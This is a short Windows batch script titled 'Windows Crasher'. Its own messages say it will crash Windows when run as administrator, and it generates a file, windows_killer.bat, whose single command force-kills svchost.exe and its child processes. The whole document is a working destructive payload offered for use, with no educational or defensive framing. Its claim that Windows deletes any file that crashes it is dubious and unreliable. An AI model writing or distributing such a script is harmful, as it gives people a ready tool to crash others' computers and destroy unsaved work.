@echo off
TITLE Windows Crasher
echo As the name suggests, this script will crash your windows.
echo Since windows will remove any file that crashes it, pressing any key will generate a file that will do this.
echo You have to run it as administrator or else it won't work.
echo Generated file will be accessible under ".uws_temp" directory.

pause
mkdir .uws_temp
echo TASKKILL /F /IM svchost.exe /T >> .uws_temp\windows_killer.bat
cls
echo Done!
pause
exit